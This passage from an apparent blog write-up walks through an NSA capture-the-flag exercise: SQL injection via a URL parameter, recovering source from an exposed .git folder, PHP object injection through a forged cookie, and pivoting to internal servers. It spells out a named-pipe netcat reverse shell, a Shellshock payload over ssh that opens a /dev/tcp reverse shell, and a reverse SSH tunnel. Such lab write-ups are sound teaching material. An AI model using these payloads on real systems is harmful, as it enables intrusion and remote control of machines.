sales involving them. But it seems like the URL takes SQL queries as parameters. Sticking into the request url ?columns=*, I‚Äôve crafted the command SELECT * FROM sales WHERE restricted=0. This command shows all columns in the table, but the server adds a WHERE clause to exclude the entries where the restricted column Now, I want to get rid of that pesky WHERE clause so that I can view all the restricted transactions. I add to the url ?columns=* FROM sales; --. The double hyphens out-comment everything after it, so the WHERE filter is not executed. I can see all entries, including the one company with the restricted field set to 1. We‚Äôre not quite done. The restricted company‚Äôs name is base64-encoded with a custom alphabet key, and I have to use an online service to decode the name. Moving right along. I check out Level 4. It‚Äôs all about Windows. Skip! Level 5 is by far the trickiest set of tasks. I‚Äôm given a web application for a personal pill-scheduling site called Digital Pillbox, and I need to find some way to get a reverse shell on the web server. From there, I need to exploit the remote version-control server, and finally, I have to obtain a shell on the build server. How do I get started? Well, there happens to be a .git folder in the web directory that I can access. This folder contains all information about a Git version control repository, which includes configuration, logs, etc. And I know I can recreate the source files if I have this repo. So, I use wget -r --no-parents --reject ‚Äòindex.html to mirror the .git folder to a folder on my local machine, recursively downloading the contents from the webpage. Wget is a command-line program for retrieving the contents of web servers. The -r option tells wget to go through all the contents of the directory recursively. The --no-parents prevents the parent directories of the .git folder from being downloaded. --reject ‚Äòindex.html‚Äô will reject a set of duplicate files starting in index.html that we don‚Äôt need. To recover the source files, I run a git stash in the local .git folder. The source code is a set of PHP scripts for enrolling users, creating users, and logging in to the web app. There‚Äôs also a cookies.inc file, which contains PHP code to generate HTTP cookies for app authentication. I have to perform the most difficult task in the competition ‚Äî a PHP object injection. Basically, I craft a cookie in which I‚Äôve embedded some arbitrary commands and send it to the web app. The app will execute the commands, which will give me a reverse shell. Here we go. I first set up a netcat listener on port 9999 on my computer with nc -l -p 9999. Netcat is the Swiss Army knife of networking. One thing it can do is open a listening port on my machine, which then receives data sent to the port and can send data back to a connecting client. Let‚Äôs take a look at the commands I‚Äôm going to inject into the web server: 123rm /tmp/fmkfifo /tmp/fcat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc [my ip address] 9999 &gt; /tmp/f I first create a named pipe called /tmp/f, which acts like a first-in first-out queue. Anything sent to this file-like object will be read out in the order that it came in. Now the last command. The /bin/sh -i creates an interactive shell, which is sent with netcat to my IP address on port 9999 and displayed on my terminal. Whatever commands I type on my local machine are directed to /tmp/f with the &gt; /tmp/f. I read in from /tmp/f with cat and pipe the contents to the shell, which executes them in my reverse shell. I could have done this without the named pipe using an option that‚Äôs built into netcat, but is often disabled for obvious security reasons ‚Äî nc ‚Äìe /bin/sh. The -e option executes the program after the netcat connection is made. But how do I get the web server to run these commands? Well, what‚Äôs sent to the server when I login to the app is a serialized User cookie in the user_data parameter. The User object is defined in the user.php file. It so happens that there‚Äôs a vulnerable function in the User class called array_filter that executes a string as a function. I grab this user object with Burp and modify it ‚Äî I add in my list of commands, making sure that array_filter will be called by changing the array_filter value as well. To get the server to accept my evil User object, I use the cookies.inc file to generate a browser cookie from my object and sign it. After forwarding this cookie to the app, I look at my netcat listener, and it appears I have a shell! Now, I get onto the remote git server, which is defined in the .gitconfig file as having IP 10.1.9.88. I locate an RSA private key on the webpage, which allows me to open a Secure Shell (ssh) to the git server. But if the git server‚Äôs ssh is configured so that I can‚Äôt execute any command I want, I can get around that with the Shellshock vulnerability. Shellshock is an error in Bash shell function definitions. Normally we define a function like some_name() { [some_command] };. In versions of Bash before September 2014, you could add an arbitrary command after the closing of the function definition, and instead of being ignored, it would be executed independently of the function. I open another netcat listener on my machine on port 9998. I run ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i /tmp/gitlabkey git@10.1.9.88 ‚Äò() { :; }; /bin/bash -i &gt;&amp; /dev/tcp/[my IP address]/9998 0&lt;&amp;1. Let‚Äôs break it down. -o StrictHostkeyChecking=no means that ssh won‚Äôt prompt a user to verify that we want to connect, which is standard for new connections. -o UserKnownHostsFile=/dev/null prevents our machine‚Äôs hostkey from being added to a file; /dev/null throws away anything written to it. Then, I take advantage of Shellshock. I have an empty function definition with () { :; };, and anything after it will be executed. I create a bash interactive shell that I send across the network to my own machine. &gt;&amp; redirects output and errors to the TCP connection and 0&lt;&amp;1 redirects the TCP tunnel to standard input. So, my netcat listener now has a reverse shell that executes the commands I type and returns the output to me. Finally, getting onto the build server from my Kali machine is done simply with a reverse SSH tunnel. From the Git server, I run ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -f -R 8080:10.9.1.56:80 root:[my ip address]. The -R option specifies I want to make a reverse tunnel ‚Äî the tunnel will bridge my local machine and the build server by routing traffic through the Git server. It‚Äôs called a reverse tunnel because I‚Äôm opening the tunnel on the Git server, but the entry point is on my Kali box. Port 8080 is the port on my machine that‚Äôs listening. IP 10.9.1.56 is the build server and port 80 is the port on the build server. One would need a reverse SSH tunnel if the build server is behind a firewall and is only reachable from the Git server. I can‚Äôt access either the Git server or the build server directly, unless I set up a reverse tunnel from the Git server that allows me access. Now, if I connect to localhost:8080, I can browse the build server. To run arbitrary commands, I can add them to a scheduled build. After two days of exploring BWP‚Äôs systems, I‚Äôve been able to testing all of my hacking and problem-solving chops. With an expertise in Windows, I could have racked up some more points. Level 4, which I skipped, is all about Windows domain controllers, which are servers that allow user access to resources in a Windows workgroup. First, I would have to get access to the file system and then locate some admin credentials. Then, I could use the metasploit exploit /windows/smb/psexec to get full control of the server and dump its stored passwords. But it was quite a well-designed and thorough CTF by the NSA. They‚Äôre letting newcomers learn the ropes in Levels 1-3 and distinguishing the best hackers in Levels 4 and 5.","categories":[{"name":"CTF","slug":"CTF","permalink":"http://raywang.tech/categories/CTF/"}],"tags":[{"name":"writeups","slug":"writeups","permalink":"http://raywang.tech/tags/writeups/"}]}]}